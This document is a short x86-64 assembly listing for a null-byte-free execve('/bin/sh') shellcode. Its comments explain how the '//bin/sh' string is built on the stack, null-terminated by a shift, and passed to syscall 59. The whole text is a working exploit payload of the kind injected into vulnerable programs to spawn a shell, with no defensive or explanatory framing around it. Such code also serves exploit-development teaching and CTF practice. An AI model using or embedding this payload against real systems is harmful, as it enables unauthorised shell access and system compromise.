global _start

section .text
      
_start:
    	xor rdi,rdi     		; rdi null
    	push rdi        		; null
    	push rdi        		; null
    	pop rsi         		; argv null
    	pop rdx         		; envp null
	mov rdi, 0x68732f6e69622f2f 	; hs/nib//
    	shr rdi, 0x08    		; no nulls, so shr to get \0
    	push rdi        		; \0hs/nib/
    	push rsp      
    	pop rdi         		; pointer to arguments
    	push 0x3b       		; execve
    	pop rax         
    	syscall         		; make the call
